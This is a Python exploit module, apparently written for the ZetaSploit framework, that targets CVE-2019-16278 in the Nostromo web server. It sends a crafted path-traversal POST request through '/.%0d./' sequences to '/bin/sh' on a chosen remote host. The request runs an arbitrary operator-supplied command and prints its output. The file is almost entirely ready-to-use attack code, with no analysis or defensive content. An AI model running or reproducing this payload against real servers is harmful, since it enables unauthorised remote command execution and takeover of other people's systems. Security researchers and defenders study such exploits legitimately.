#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import sys
import socket

from core.parser import parser
from core.badges import badges

class ZetaSploitModule:
    def __init__(self):
        self.parser = parser()
        self.badges = badges()
        
        self.details = {
            'Name': "exploit/multi/nostromo_httpd/cve_2019_16278",
            'Authors': [
                'enty8080',
                'Kr0ff'
            ],
            'Description': "Remote Code Execution in Nostromo httpd.",
            'Comments': [
                ''
            ],
            'Risk': "high"
        }
        
        self.options = {
            'RHOST': {
                'Description': "Remote host.",
                'Value': None,
                'Required': True
            },
            'RPORT': {
                'Description': "Remote port.",
                'Value': 80,
                'Required': True
            },
            'COMMAND': {
                'Description': "Command to execute",
                'Value': None,
                'Required': True
            }
        }
        
    def connect(self, soc):
        response = ""
        try:
            while True:
                connection = soc.recv(1024).decode()
                if len(connection) == 0:
                    break
                response += connection
        except Exception:
            pass
        return response
    
    def cve(self, target, port, cmd):
        self.badges.output_process("Generating payload...")
        payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1'.format(cmd)
        
        self.badges.output_process("Sending payload...")
        soc = socket.socket()
        soc.connect((target, int(port)))
        soc.send(payload.encode())
        
        self.badges.output_process("Attempting to execute command...")
        receive = self.connect(soc)
        
        self.badges.output_information("Command output:")
        print(receive)
        
    def run(self):
        remote_host, remote_port, command = self.parser.parse_options(self.options)
        self.badges.output_process("Exploiting " + remote_host + ":" + remote_port + "...")
        
        try:
            self.cve(remote_host, remote_port, command)
        except (EOFError, KeyboardInterrupt):
            pass
        except Exception:
            self.badges.output_error("Failed to exploit!")
